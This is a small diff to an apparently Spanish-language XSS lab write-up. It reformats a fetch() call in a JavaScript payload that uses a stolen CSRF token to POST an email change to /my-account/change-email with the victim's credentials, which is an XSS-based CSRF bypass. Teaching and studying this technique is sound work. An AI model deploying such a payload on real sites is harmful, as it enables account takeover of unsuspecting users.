@@ -43,8 +43,7 @@ Este enfoque funciona porque el XSS ejecuta JavaScript en el contexto del origen
         // 2) Enviar el cambio de email con application/x-www-form-urlencoded
         const body = 'csrf=' + encodeURIComponent(csrf) + '&email=' + encodeURIComponent('test@test.com');
         await fetch('/my-account/change-email', {
-            method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body, credentials: 'include'
+            method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body, credentials: 'include'
         });
     } catch (e) {
         console.log('XSS CSRF bypass error:', e);
